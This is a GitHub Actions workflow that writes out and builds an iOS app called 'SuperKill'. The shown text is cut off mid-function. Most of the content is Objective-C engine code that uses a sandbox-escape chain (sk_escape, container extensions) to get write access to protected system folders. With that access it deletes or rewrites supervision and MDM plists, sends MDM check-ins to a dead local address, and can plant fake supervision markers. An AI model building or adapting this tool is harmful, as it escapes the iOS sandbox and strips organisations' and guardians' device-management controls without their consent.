name: build-ipa-onefile

# 单文件引导版：不需要上传任何文件夹，把本文件内容整段粘进 GitHub 的新建文件页即可。
# 它会在 macOS runner 上写出源码 -> 生成工程 -> 编译 -> 产出未签名 ipa。

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  ipa:
    runs-on: macos-latest
    timeout-minutes: 25
    env:
      APP_GROUP: group.cc.replace.superkill
      BUNDLE_ID: cc.replace.superkill
    steps:
      - name: 写入源码与工程文件
        run: |
          set -euo pipefail
          mkdir -p Sources
          cat > Sources/main.m <<'SK_EOF_00_MAIN_M'
          //
          //  main.m
          //  SuperKill
          //

          #import <UIKit/UIKit.h>
          #import "SKAppDelegate.h"

          int main(int argc, char *argv[]) {
              @autoreleasepool {
                  return UIApplicationMain(argc, argv, nil, NSStringFromClass([SKAppDelegate class]));
              }
          }
          SK_EOF_00_MAIN_M
          mkdir -p Sources
          cat > Sources/SKAppDelegate.h <<'SK_EOF_01_SKAPPDELEGATE_H'
          //
          //  SKAppDelegate.h
          //  SuperKill
          //

          #import <UIKit/UIKit.h>

          @interface SKAppDelegate : UIResponder <UIApplicationDelegate>

          @property (nonatomic, strong) UIWindow *window;

          @end
          SK_EOF_01_SKAPPDELEGATE_H
          mkdir -p Sources
          cat > Sources/SKAppDelegate.m <<'SK_EOF_02_SKAPPDELEGATE_M'
          //
          //  SKAppDelegate.m
          //  SuperKill
          //

          #import "SKAppDelegate.h"
          #import "SKMainViewController.h"

          @implementation SKAppDelegate

          - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
              self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
              SKMainViewController *root = [[SKMainViewController alloc] init];
              UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:root];
              self.window.rootViewController = nav;
              [self.window makeKeyAndVisible];
              return YES;
          }

          @end
          SK_EOF_02_SKAPPDELEGATE_M
          mkdir -p Sources
          cat > Sources/SKEngine.h <<'SK_EOF_03_SKENGINE_H'
          //
          //  SKEngine.h
          //  SuperKill
          //
          //  监管（Supervision）/ MDM 状态清除引擎。
          //  通过 worse_query 取得 systemgroup.com.apple.configurationprofiles 的读写权限，
          //  然后备份 / 删除 / 补丁 / 回滚监管相关 plist。
          //

          #import <Foundation/Foundation.h>

          NS_ASSUME_NONNULL_BEGIN

          typedef void (^SKLogBlock)(NSString *line);

          /// 监管与 MDM 状态的系统级落盘位置（iOS 13 - 27 通用）
          extern NSString *const SKConfigurationProfilesRoot;
          extern NSString *const SKDeviceManagementRoot;
          extern NSString *const SKUserProfilesRoot;

          @interface SKEngine : NSObject

          /// 日志回调，可能在任意线程被调用，UI 层自行切主线程
          @property (nonatomic, copy, nullable) SKLogBlock logger;

          /// 当前使用的 App Group（默认取 NSUserDefaults/Info.plist 的 SKAppGroup）
          @property (nonatomic, readwrite, copy) NSString *appGroup;

          + (NSString *)configuredAppGroup;
          + (void)setConfiguredAppGroup:(NSString *)group;

          /// 环境自检：系统版本、App Group、容器可访问性
          - (NSString *)environmentReport;

          /// 读取并汇报监管状态（组织名、IsSupervised、MDM ServerURL 等）
          - (NSString *)inspectSupervision;

          /// 最近一次检测到的 IsSupervised 值；未知返回 -1
          - (NSInteger)supervisedState;

          /// 备份三个根目录到 Documents/backups/<时间戳>/，返回备份目录路径
          - (nullable NSString *)backup:(NSError **)error;

          /// 彻底清除监管 + MDM 落盘状态（aggressive = 顺带清空所有 profile stub）
          - (BOOL)wipeSupervision:(BOOL)aggressive error:(NSError **)error;

          /// 温和模式：原地改写 plist，字段降权但保留文件（适合只想摆脱限制、保留 profile 的场景）
          - (BOOL)patchSupervision:(NSError **)error;

          /// 测试用反向操作：写入监管标记（IsSupervised / OrganizationName / ConfigurationURL 等），
          /// 重启后设备会显示“此 iPhone 受监管”。withMDM 为真时同时写一份 MDM.plist 占位。
          - (BOOL)enableSupervisionWithOrganization:(NSString *)organization
                                             email:(NSString *)email
                                  configurationURL:(NSString *)url
                                           withMDM:(BOOL)withMDM
                                             error:(NSError **)error;

          /// 用 Documents/backups 里最新一份备份覆盖回去
          - (BOOL)restoreLatestBackup:(NSError **)error;

          #pragma mark - 快照与对比

          /// 记录当前状态快照（Documents/snapshots/<时间戳>-<label>.plist），返回一行摘要
          - (NSString *)captureSnapshotWithLabel:(NSString *)label;

          /// 对快照链逐对做 diff，最后再和“当前实时状态”比一次；结果同时输出到日志
          - (NSString *)diffSnapshotChain;

          /// 释放所有已 consume 的扩展
          - (void)releaseAllExtensions;

          @end

          NS_ASSUME_NONNULL_END
          SK_EOF_03_SKENGINE_H
          mkdir -p Sources
          cat > Sources/SKEngine.m <<'SK_EOF_04_SKENGINE_M'
          //
          //  SKEngine.m
          //  SuperKill
          //

          #import "SKEngine.h"
          #import "worse_query.h"

          #import <Foundation/Foundation.h>
          #import <dlfcn.h>
          #import <sys/stat.h>
          #import <xpc/xpc.h>

          NSString *const SKConfigurationProfilesRoot =
          @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles";
          NSString *const SKDeviceManagementRoot = @"/private/var/mobile/Library/DeviceManagement";
          NSString *const SKUserProfilesRoot = @"/private/var/mobile/Library/ConfigurationProfiles";

          static NSString *const SKGroupDefaultsKey = @"SKAppGroup";
          static NSString *const SKGroupUserSetKey = @"SKAppGroupUserSet";
          static NSString *const SKGroupInfoKey = @"SKAppGroup";

          #pragma mark - plist helpers

          static BOOL SKWritePlist(id plist, NSString *path) {
              if (!plist || path.length == 0) return NO;
              NSError *error = nil;
              NSData *data = [NSPropertyListSerialization dataWithPropertyList:plist
                                                                        format:NSPropertyListXMLFormat_v1_0
                                                                       options:0
                                                                         error:&error];
              if (!data) return NO;
              return [data writeToFile:path options:NSDataWritingAtomic error:&error];
          }

          static id SKReadPlist(NSString *path) {
              if (path.length == 0) return nil;
              NSData *data = [NSData dataWithContentsOfFile:path];
              if (!data) return nil;
              return [NSPropertyListSerialization propertyListWithData:data
                                                               options:NSPropertyListMutableContainersAndLeaves
                                                                format:NULL
                                                                 error:NULL];
          }

          #pragma mark - SKEngine

          @interface SKEngine ()
          @property (nonatomic, strong) NSMutableDictionary<NSString *, NSNumber *> *handles;
          @property (nonatomic, assign) NSInteger supervisedState;

          - (void)log:(NSString *)format, ... NS_FORMAT_FUNCTION(1, 2);
          - (BOOL)hasAccessTo:(NSString *)path;
          - (BOOL)grantAccessTo:(NSString *)root;
          - (NSString *)hintForCode:(int64_t)code;
          - (NSArray<NSString *> *)entriesIn:(NSString *)root;
          - (BOOL)removeItem:(NSString *)path;
          - (void)emptyPayloadManifestIn:(NSString *)root;
          - (NSString *)backupsRoot;
          - (void)mirrorCloudConfiguration:(NSDictionary *)cloud;

          - (NSString *)snapshotsRoot;
          - (NSDictionary *)captureState;
          - (NSDictionary *)describeEntriesIn:(NSString *)root;
          - (NSDictionary *)subsetOf:(NSDictionary *)dict keys:(NSArray<NSString *> *)keys;
          - (NSString *)summarizeState:(NSDictionary *)state;
          - (NSString *)snapshotTitle:(NSDictionary *)snapshot;
          - (NSString *)valueText:(id)value;
          - (NSString *)diffFrom:(NSDictionary *)left to:(NSDictionary *)right;
          - (void)appendEntriesDiffFrom:(NSDictionary *)left
                                     to:(NSDictionary *)right
                                   into:(NSMutableString *)out;
          - (void)appendValuesDiffFrom:(NSDictionary *)left
                                    to:(NSDictionary *)right
                               section:(NSString *)section
                                  into:(NSMutableString *)out;
          @end

          @implementation SKEngine

          - (instancetype)init {
              if ((self = [super init])) {
                  _handles = [NSMutableDictionary dictionary];
                  _appGroup = [SKEngine configuredAppGroup];
                  _supervisedState = -1;
              }
              return self;
          }

          + (NSString *)appGroupFromEntitlements {
              // libxpc 导出 xpc_copy_entitlement_for_self()，用它读自己签名里的 app group，
              // 这样自签后不需要手输 group，也不会因为填错而报 -1。
              typedef xpc_object_t (*sk_copy_entitlement_fn)(const char *);
              sk_copy_entitlement_fn copy = (sk_copy_entitlement_fn)dlsym(RTLD_DEFAULT, "xpc_copy_entitlement_for_self");
              if (!copy) {
                  void *libxpc = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
                  if (libxpc) copy = (sk_copy_entitlement_fn)dlsym(libxpc, "xpc_copy_entitlement_for_self");
              }
              if (!copy) return nil;

              xpc_object_t value = copy("com.apple.security.application-groups");
              if (!value || xpc_get_type(value) != XPC_TYPE_ARRAY) return nil;

              NSFileManager *fm = [NSFileManager defaultManager];
              size_t count = xpc_array_get_count(value);
              for (size_t i = 0; i < count; i++) {
                  const char *raw = xpc_array_get_string(value, i);
                  if (!raw) continue;
                  NSString *group = [NSString stringWithUTF8String:raw];
                  // 只有真的拿到容器，才说明这个 group 在签名/描述文件里被认可
                  if (group.length && [fm containerURLForSecurityApplicationGroupIdentifier:group]) {
                      return group;
                  }
              }
              return nil;
          }

          + (NSString *)configuredAppGroup {
              NSString *detected = [self appGroupFromEntitlements];
              if (detected.length) return detected;

              NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
              NSString *manual = [defaults stringForKey:SKGroupDefaultsKey];
              if ([defaults boolForKey:SKGroupUserSetKey] && manual.length) return manual;

              NSString *fallback = [[NSBundle mainBundle] objectForInfoDictionaryKey:SKGroupInfoKey];
              return fallback.length ? fallback : @"";
          }

          + (void)setConfiguredAppGroup:(NSString *)group {
              NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
              [defaults setObject:(group ?: @"") forKey:SKGroupDefaultsKey];
              [defaults setBool:YES forKey:SKGroupUserSetKey];
              [defaults synchronize];
          }

          - (void)log:(NSString *)format, ... NS_FORMAT_FUNCTION(1, 2) {
              va_list args;
              va_start(args, format);
              NSString *line = [[NSString alloc] initWithFormat:format arguments:args];
              va_end(args);
              SKLogBlock logger = self.logger;
              if (logger) logger(line);
          }

          #pragma mark - 扩展管理

          - (BOOL)hasAccessTo:(NSString *)path {
              for (NSString *granted in self.handles) {
                  if ([path isEqualToString:granted]) return YES;
                  if ([path hasPrefix:[granted stringByAppendingString:@"/"]]) return YES;
              }
              return NO;
          }

          - (BOOL)grantAccessTo:(NSString *)root {
              if ([self hasAccessTo:root]) return YES;
              if (self.appGroup.length == 0) {
                  [self log:@"✗ 没有配置 App Group，签名时必须注入 com.apple.security.application-groups"];
                  return NO;
              }
              if (!sk_has_app_group(self.appGroup)) {
                  [self log:@"✗ App Group 不可用：%@", self.appGroup];
                  [self log:@"  说明：entitlements 里的 group 必须在你自己的开发者账号下注册过，并且随描述文件一起签名"];
                  return NO;
              }
              int64_t flags = 0;
              int64_t handle = sk_escape(root, self.appGroup, false, &flags);
              if (handle <= 0) {
                  [self log:@"✗ %@ 取得扩展失败（code %lld）%@",
                        root.lastPathComponent, (long long)handle, [self hintForCode:handle]];
                  return NO;
              }
              self.handles[root] = @(handle);
              [self log:@"✓ %@ 已拿到扩展 handle=%lld flags=0x%llx",
                    root.lastPathComponent, (long long)handle, (unsigned long long)flags];
              return YES;
          }

          - (NSString *)hintForCode:(int64_t)code {
              switch (code) {
                  case -1:  return @"App Group 无效";
                  case -2:  return @"系统版本不支持（dylib 或符号缺失）";
                  case -3:  return @"container_query 创建失败";
                  case -4:  return @"符号链接创建失败";
                  case -5:  return @"containermanagerd 拒绝 query（flags/part 不匹配）";
                  case -6:  return @"内核拒绝签发扩展";
                  case -255: return @"目标路径不存在";
                  default: return @"";
              }
          }

          - (void)releaseAllExtensions {
              for (NSString *path in self.handles.allKeys) {
                  sk_escape_release(self.handles[path].longLongValue);
                  [self log:@"↺ 释放扩展 %@", path.lastPathComponent];
              }
              [self.handles removeAllObjects];
          }

          #pragma mark - 自检 / 检测

          - (NSString *)environmentReport {
              NSMutableString *out = [NSMutableString string];
              NSOperatingSystemVersion v = [NSProcessInfo processInfo].operatingSystemVersion;
              [out appendFormat:@"iOS: %ld.%ld.%ld\n", (long)v.majorVersion, (long)v.minorVersion, (long)v.patchVersion];
              [out appendFormat:@"App Group: %@\n", self.appGroup.length ? self.appGroup : @"(空)"];
              NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:self.appGroup];
              [out appendFormat:@"Group 容器: %@\n", sk_has_app_group(self.appGroup) ? @"可访问" : @"不可访问"];
              if (groupURL) [out appendFormat:@"容器路径: %@\n", groupURL.path];

              // 主动探一次真实目标：能拿到扩展就说明整条逃逸链在你这个版本上成立
              BOOL cfg = [self grantAccessTo:SKConfigurationProfilesRoot];
              BOOL dev = [self grantAccessTo:SKDeviceManagementRoot];
              [out appendFormat:@"ConfigurationProfiles: %@\n", cfg ? @"扩展已取得（逃逸可用）" : @"扩展失败"];
              [out appendFormat:@"DeviceManagement: %@\n", dev ? @"扩展已取得" : @"不可用（未登记 MDM 时属正常）"];
              [out appendFormat:@"已持有句柄: %lu\n", (unsigned long)self.handles.count];
              return out;
          }

          - (NSArray<NSString *> *)entriesIn:(NSString *)root {
              NSError *error = nil;
              NSArray<NSString *> *list = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:root error:&error];
              if (!list) {
                  [self log:@"  读取目录失败 %@: %@", root.lastPathComponent, error.localizedDescription];
                  return @[];
              }
              return list;
          }

          - (NSString *)inspectSupervision {
              NSMutableString *out = [NSMutableString string];

              if ([self grantAccessTo:SKConfigurationProfilesRoot]) {
                  [out appendFormat:@"== %@ ==\n", SKConfigurationProfilesRoot.lastPathComponent];
                  for (NSString *name in [self entriesIn:SKConfigurationProfilesRoot]) {
                      [out appendFormat:@"  • %@\n", name];
                  }

                  NSString *ccdPath = [SKConfigurationProfilesRoot stringByAppendingPathComponent:@"CloudConfigurationDetails.plist"];
                  NSDictionary *ccd = SKReadPlist(ccdPath);
                  if ([ccd isKindOfClass:[NSDictionary class]]) {
                      id supervised = ccd[@"IsSupervised"];
                      self.supervisedState = [supervised respondsToSelector:@selector(integerValue)] ? [supervised integerValue] : -1;
                      [out appendFormat:@"\n监管: IsSupervised = %@\n", supervised ?: @"(缺省)"];
                      [out appendFormat:@"组织: %@\n", ccd[@"OrganizationName"] ?: @"(无)"];
                      [out appendFormat:@"IsMandatory = %@ / IsMDMUnremovable = %@\n",
                          ccd[@"IsMandatory"] ?: @"(无)", ccd[@"IsMDMUnremovable"] ?: @"(无)"];
                      [out appendFormat:@"ConfigurationURL: %@\n", ccd[@"ConfigurationURL"] ?: @"(无)"];
                  } else {
                      [out appendString:@"\n监管: 未找到 CloudConfigurationDetails.plist（可能已清除）\n"];
                      self.supervisedState = 0;
                  }

                  NSDictionary *mdm = SKReadPlist([SKConfigurationProfilesRoot stringByAppendingPathComponent:@"MDM.plist"]);
                  if ([mdm isKindOfClass:[NSDictionary class]]) {
                      [out appendFormat:@"\nMDM ServerURL: %@\n", mdm[@"ServerURL"] ?: @"(无)"];
                      [out appendFormat:@"MDM CheckInURL: %@\n", mdm[@"CheckInURL"] ?: @"(无)"];
                      [out appendFormat:@"MDM Topic: %@\n", mdm[@"Topic"] ?: @"(无)"];
                  }
              }

              if ([self grantAccessTo:SKDeviceManagementRoot]) {
                  [out appendFormat:@"\n== %@ ==\n", SKDeviceManagementRoot.lastPathComponent];
                  for (NSString *name in [self entriesIn:SKDeviceManagementRoot]) {
                      [out appendFormat:@"  • %@\n", name];
                  }
              }

              if ([self grantAccessTo:SKUserProfilesRoot]) {
                  [out appendFormat:@"\n== %@ ==\n", SKUserProfilesRoot.lastPathComponent];
                  for (NSString *name in [self entriesIn:SKUserProfilesRoot]) {
                      [out appendFormat:@"  • %@\n", name];
                  }
              }

              [self log:@"%@", out];
              return out;
          }

          #pragma mark - 备份

          - (NSString *)backupsRoot {
              NSString *documents = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
              return [documents stringByAppendingPathComponent:@"backups"];
          }

          - (NSString *)backup:(NSError **)error {
              NSFileManager *fm = [NSFileManager defaultManager];
              NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
              formatter.dateFormat = @"yyyyMMdd-HHmmss";
              NSString *stamp = [formatter stringFromDate:[NSDate date]];

              NSString *root = [self backupsRoot];
              [fm createDirectoryAtPath:root withIntermediateDirectories:YES attributes:nil error:NULL];
              NSString *dest = [root stringByAppendingPathComponent:stamp];
              NSError *createError = nil;
              if (![fm createDirectoryAtPath:dest withIntermediateDirectories:YES attributes:nil error:&createError]) {
                  if (error) *error = createError;
                  return nil;
              }

              NSArray<NSString *> *roots = @[SKConfigurationProfilesRoot, SKDeviceManagementRoot, SKUserProfilesRoot];
              NSMutableDictionary<NSString *, NSString *> *map = [NSMutableDictionary dictionary];
              NSInteger total = 0;

              for (NSUInteger i = 0; i < roots.count; i++) {
                  NSString *source = roots[i];
                  if (![self grantAccessTo:source]) continue;

                  NSString *slug = [NSString stringWithFormat:@"%lu-%@", (unsigned long)i, source.lastPathComponent];
                  NSString *dst = [dest stringByAppendingPathComponent:slug];
                  [fm createDirectoryAtPath:dst withIntermediateDirectories:YES attributes:nil error:NULL];

                  NSInteger copied = 0;
                  for (NSString *name in [self entriesIn:source]) {
                      NSString *from = [source stringByAppendingPathComponent:name];
                      NSString *to = [dst stringByAppendingPathComponent:name];
                      if ([fm copyItemAtPath:from toPath:to error:NULL]) copied++;
                  }
                  map[slug] = source;
                  total += copied;
                  [self log:@"备份 %@ → %ld 项", source.lastPathComponent, (long)copied];
              }

              SKWritePlist(map, [dest stringByAppendingPathComponent:@"roots.plist"]);
              [self log:@"✓ 备份完成（%ld 项）: %@", (long)total, dest];
              return dest;
          }

          #pragma mark - 清除

          - (BOOL)removeItem:(NSString *)path {
              NSError *error = nil;
              if ([[NSFileManager defaultManager] fileExistsAtPath:path] == NO) return NO;
              BOOL ok = [[NSFileManager defaultManager] removeItemAtPath:path error:&error];
              [self log:@"%@ %@", ok ? @"− 删除" : @"✗ 删除失败", path.lastPathComponent];
              if (!ok && error) [self log:@"    %@", error.localizedDescription];
              return ok;
          }

          - (void)emptyPayloadManifestIn:(NSString *)root {
              NSString *path = [root stringByAppendingPathComponent:@"PayloadManifest.plist"];
              id manifest = SKReadPlist(path);
              if (![manifest isKindOfClass:[NSDictionary class]]) return;
              NSMutableDictionary *dict = [manifest mutableCopy];
              dict[@"OrderedProfiles"] = @[];
              if (SKWritePlist(dict, path)) {
                  [self log:@"✓ PayloadManifest.OrderedProfiles 已清空"];
              }
          }

          - (BOOL)wipeSupervision:(BOOL)aggressive error:(NSError **)error {
              BOOL touched = NO;

              // 1. 监管 + MDM 主状态目录（systemgroup.com.apple.configurationprofiles）
              if ([self grantAccessTo:SKConfigurationProfilesRoot]) {
                  NSArray<NSString *> *core = @[
                      @"CloudConfigurationDetails.plist",
                      @"CloudConfigurationSetAsideDetails.plist",
                      @"MDM.plist",
                      @"MDMEvents.plist",
                      @"MDMAppManagement.plist",
                      @"ProfileTruth.plist",
                      @"Truth.plist",
                      @"ClientTruth.plist",
                  ];
                  for (NSString *name in core) {
                      [self removeItem:[SKConfigurationProfilesRoot stringByAppendingPathComponent:name]];
                  }
                  [self emptyPayloadManifestIn:SKConfigurationProfilesRoot];

                  if (aggressive) {
                      // 所有 GUID.stub 一并清掉，让 profiled 认为一个 profile 都没装过
                      for (NSString *name in [self entriesIn:SKConfigurationProfilesRoot]) {
                          if ([name.pathExtension isEqualToString:@"stub"]) {
                              [self removeItem:[SKConfigurationProfilesRoot stringByAppendingPathComponent:name]];
                          }
                      }
                  }
                  touched = YES;
              }

              // 2. 设备管理层状态（ClientTruth / MDM 副本）
              if ([self grantAccessTo:SKDeviceManagementRoot]) {
                  NSArray<NSString *> *mgmt = @[
                      @"ClientTruth.plist",
                      @"CloudConfigurationDetails.plist",
                      @"MDM.plist",
                      @"MDMEvents.plist",
                      @"MDMAppManagement.plist",
                      @"ManagementState.plist",
                  ];
                  for (NSString *name in mgmt) {
                      [self removeItem:[SKDeviceManagementRoot stringByAppendingPathComponent:name]];
                  }
                  touched = YES;
              }

              // 3. 用户级 profile 目录
              if (aggressive && [self grantAccessTo:SKUserProfilesRoot]) {
                  for (NSString *name in [self entriesIn:SKUserProfilesRoot]) {
                      [self removeItem:[SKUserProfilesRoot stringByAppendingPathComponent:name]];
                  }
              }

              if (!touched) {
                  if (error) {
                      *error = [NSError errorWithDomain:@"SuperKill"
                                                   code:1
                                               userInfo:@{NSLocalizedDescriptionKey: @"一个目标目录都没拿到访问权限"}];
                  }
                  return NO;
              }

              [self log:@"✓ 监管状态已清除：请保持断网并重启设备"];
              return YES;
          }

          #pragma mark - 温和补丁

          - (BOOL)patchSupervision:(NSError **)error {
              if (![self grantAccessTo:SKConfigurationProfilesRoot]) {
                  if (error) {
                      *error = [NSError errorWithDomain:@"SuperKill"
                                                   code:2
                                               userInfo:@{NSLocalizedDescriptionKey: @"拿不到 ConfigurationProfiles 扩展"}];
                  }
                  return NO;
              }

              BOOL changed = NO;

              NSString *ccdPath = [SKConfigurationProfilesRoot stringByAppendingPathComponent:@"CloudConfigurationDetails.plist"];
              id ccdRaw = SKReadPlist(ccdPath);
              NSMutableDictionary *ccd = [ccdRaw isKindOfClass:[NSDictionary class]] ? [ccdRaw mutableCopy] : nil;
              if (ccd) {
                  ccd[@"IsSupervised"] = @NO;
                  ccd[@"IsMandatory"] = @NO;
                  ccd[@"IsMDMUnremovable"] = @0;
                  ccd[@"ConfigurationURL"] = @"https://127.0.0.1:1/";
                  if (SKWritePlist(ccd, ccdPath)) {
                      changed = YES;
                      [self log:@"✓ CloudConfigurationDetails：IsSupervised / IsMandatory 已降为 false"];
                  }
              }

              NSString *mdmPath = [SKConfigurationProfilesRoot stringByAppendingPathComponent:@"MDM.plist"];
              id mdmRaw = SKReadPlist(mdmPath);
              NSMutableDictionary *mdm = [mdmRaw isKindOfClass:[NSDictionary class]] ? [mdmRaw mutableCopy] : nil;
              if (mdm) {
                  mdm[@"ServerURL"] = @"https://127.0.0.1:1/";
                  mdm[@"CheckInURL"] = @"https://127.0.0.1:1/";
                  mdm[@"SignMessage"] = @NO;
                  if (SKWritePlist(mdm, mdmPath)) {
                      changed = YES;
                      [self log:@"✓ MDM.plist：Server/CheckIn 已指向黑洞地址"];
                  }
              }

              NSString *appMgmtPath = [SKConfigurationProfilesRoot stringByAppendingPathComponent:@"MDMAppManagement.plist"];
              id appRaw = SKReadPlist(appMgmtPath);
              NSMutableDictionary *appMgmt = [appRaw isKindOfClass:[NSDictionary class]] ? [appRaw mutableCopy] : nil;
              if (appMgmt) {
                  appMgmt[@"metadataByBundleID"] = @{};
                  if (SKWritePlist(appMgmt, appMgmtPath)) {
                      changed = YES;
                      [self log:@"✓ MDMAppManagement：托管 App 清单已清空"];
                  }
              }

              [self emptyPayloadManifestIn:SKConfigurationProfilesRoot];

              if (!changed) {
                  [self log:@"✗ 没有可改写的 plist（可能已经是干净的）"];
              }
              return changed;
          }

          #pragma mark - 开启监管（测试）

          - (BOOL)enableSupervisionWithOrganization:(NSString *)organization
                                             email:(NSString *)email
                                  configurationURL:(NSString *)url
                                           withMDM:(BOOL)withMDM
                                             error:(NSError **)error {
              if (![self grantAccessTo:SKConfigurationProfilesRoot]) {
                  if (error) {
                      *error = [NSError errorWithDomain:@"SuperKill"
                                                   code:5
                                               userInfo:@{NSLocalizedDescriptionKey: @"拿不到 ConfigurationProfiles 扩展"}];
                  }
                  return NO;
              }

              NSString *ccdPath = [SKConfigurationProfilesRoot stringByAppendingPathComponent:@"CloudConfigurationDetails.plist"];
              id existing = SKReadPlist(ccdPath);
              NSMutableDictionary *ccd = [existing isKindOfClass:[NSDictionary class]]
                  ? [existing mutableCopy]
                  : [NSMutableDictionary dictionary];

              // 与真实监管设备写入的键值保持一致，profiled / DeviceManagement 认这几个字段
              ccd[@"IsSupervised"] = @YES;
              ccd[@"IsMandatory"] = @YES;
              ccd[@"IsMDMUnremovable"] = @1;
              ccd[@"IsMultiUser"] = @NO;
              ccd[@"ConfigurationWasApplied"] = @YES;
              ccd[@"OrganizationName"] = organization.length ? organization : @"Test Organization";
              ccd[@"ConfigurationURL"] = url.length ? url : @"https://mdm.invalid/profile";
              ccd[@"LastModifiedTime"] = [NSDate date];
              if (email.length) ccd[@"OrganizationEmail"] = email;

              if (!SKWritePlist(ccd, ccdPath)) {
                  if (error) {
                      *error = [NSError errorWithDomain:@"SuperKill"
                                                   code:6
                                               userInfo:@{NSLocalizedDescriptionKey: @"CloudConfigurationDetails.plist 写入失败"}];
                  }
                  [self log:@"✗ 写入 CloudConfigurationDetails.plist 失败"];
                  return NO;
              }
              [self log:@"✓ 已写入监管标记：IsSupervised = true，组织 = %@", ccd[@"OrganizationName"]];

              if (withMDM) {
                  NSString *mdmPath = [SKConfigurationProfilesRoot stringByAppendingPathComponent:@"MDM.plist"];
                  id mdmRaw = SKReadPlist(mdmPath);
                  NSMutableDictionary *mdm = [mdmRaw isKindOfClass:[NSDictionary class]]
                      ? [mdmRaw mutableCopy]
                      : [NSMutableDictionary dictionary];
                  mdm[@"ServerURL"] = @"https://mdm.invalid/mdm";
                  mdm[@"CheckInURL"] = @"https://mdm.invalid/checkin";
                  mdm[@"Topic"] = @"com.apple.mgmt.External.test";
                  mdm[@"SignMessage"] = @NO;
                  if (SKWritePlist(mdm, mdmPath)) {
                      [self log:@"✓ 已写入 MDM.plist 占位（无 APNs 证书，不会真的注册）"];
                  } else {
                      [self log:@"✗ MDM.plist 写入失败"];
                  }
              }

              // 读回校验，确认落盘成功
              NSDictionary *verify = SKReadPlist(ccdPath);
              BOOL supervised = [verify[@"IsSupervised"] boolValue];
              [self log:supervised ? @"✓ 读回校验通过：IsSupervised = true（重启后生效）"
                                   : @"✗ 读回校验失败：IsSupervised 不是 true"];

              // DeviceManagement 侧再镜像一份：部分版本优先读这里
              [self mirrorCloudConfiguration:ccd];
              return supervised;
          }

          - (void)mirrorCloudConfiguration:(NSDictionary *)cloud {
              if (![self grantAccessTo:SKDeviceManagementRoot]) return;

              NSString *mirrorPath = [SKDeviceManagementRoot stringByAppendingPathComponent:@"CloudConfigurationDetails.plist"];
              if (SKWritePlist(cloud, mirrorPath)) {
                  [self log:@"✓ DeviceManagement/CloudConfigurationDetails.plist 已镜像"];
              }

              NSString *truthPath = [SKDeviceManagementRoot stringByAppendingPathComponent:@"ClientTruth.plist"];
              id truthRaw = SKReadPlist(truthPath);
              if (![truthRaw isKindOfClass:[NSDictionary class]]) return;
              NSMutableDictionary *truth = [truthRaw mutableCopy];

              id entryRaw = truth[@"CloudConfiguration"];
              NSMutableDictionary *entry = [entryRaw isKindOfClass:[NSDictionary class]]
                  ? [entryRaw mutableCopy]
                  : [NSMutableDictionary dictionary];
              entry[@"IsSupervised"] = @YES;
              entry[@"IsMandatory"] = @YES;
              entry[@"OrganizationName"] = cloud[@"OrganizationName"] ?: @"Test Organization";
              truth[@"CloudConfiguration"] = entry;
              if (SKWritePlist(truth, truthPath)) {
                  [self log:@"✓ ClientTruth.CloudConfiguration 已同步为受监管"];
              }
          }

          #pragma mark - 快照与对比

          static NSArray<NSString *> *SKCloudKeys(void) {
              return @[@"IsSupervised", @"IsMandatory", @"IsMDMUnremovable", @"IsMultiUser",
                       @"ConfigurationWasApplied", @"OrganizationName", @"OrganizationEmail",
                       @"ConfigurationURL"];
          }

          static NSArray<NSString *> *SKMDMKeys(void) {
              return @[@"ServerURL", @"CheckInURL", @"Topic", @"SignMessage"];
          }

          static NSArray<NSString *> *SKTruthKeys(void) {
              return @[@"IsSupervised", @"IsMandatory", @"OrganizationName"];
          }

          - (NSString *)snapshotsRoot {
              NSString *documents = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
              return [documents stringByAppendingPathComponent:@"snapshots"];
          }

          - (NSDictionary *)subsetOf:(NSDictionary *)dict keys:(NSArray<NSString *> *)keys {
              NSMutableDictionary *out = [NSMutableDictionary dictionary];
              if (![dict isKindOfClass:[NSDictionary class]]) return out;
              for (NSString *key in keys) {
                  id value = dict[key];
                  if (value) out[key] = value;
              }
              return out;
          }

          - (NSDictionary *)describeEntriesIn:(NSString *)root {
              NSFileManager *fm = [NSFileManager defaultManager];
              NSMutableDictionary *out = [NSMutableDictionary dictionary];
              for (NSString *name in [self entriesIn:root]) {
                  NSString *path = [root stringByAppendingPathComponent:name];
                  NSDictionary *attributes = [fm attributesOfItemAtPath:path error:NULL];
                  NSMutableDictionary *meta = [NSMutableDictionary dictionary];
                  meta[@"size"] = @([attributes[NSFileSize] unsignedLongLongValue]);
                  meta[@"mtime"] = @((long long)[attributes[NSFileModificationDate] timeIntervalSince1970]);
                  meta[@"dir"] = @([attributes[NSFileType] isEqualToString:NSFileTypeDirectory]);
                  out[name] = meta;
              }
              return out;
          }

          - (NSDictionary *)captureState {
              NSMutableDictionary *state = [NSMutableDictionary dictionary];
              state[@"created"] = [NSDate date];

              NSOperatingSystemVersion v = [NSProcessInfo processInfo].operatingSystemVersion;
              state[@"os"] = [NSString stringWithFormat:@"%ld.%ld.%ld",
                              (long)v.majorVersion, (long)v.minorVersion, (long)v.patchVersion];

              NSMutableDictionary *roots = [NSMutableDictionary dictionary];

              // 1) ConfigurationProfiles
              NSMutableDictionary *cfg = [NSMutableDictionary dictionary];
              BOOL cfgAvailable = [self grantAccessTo:SKConfigurationProfilesRoot];
              cfg[@"available"] = @(cfgAvailable);
              if (cfgAvailable) {
                  cfg[@"entries"] = [self describeEntriesIn:SKConfigurationProfilesRoot];

                  id cloud = SKReadPlist([SKConfigurationProfilesRoot stringByAppendingPathComponent:@"CloudConfigurationDetails.plist"]);
                  if ([cloud isKindOfClass:[NSDictionary class]]) {
                      cfg[@"cloud"] = [self subsetOf:cloud keys:SKCloudKeys()];
                  }
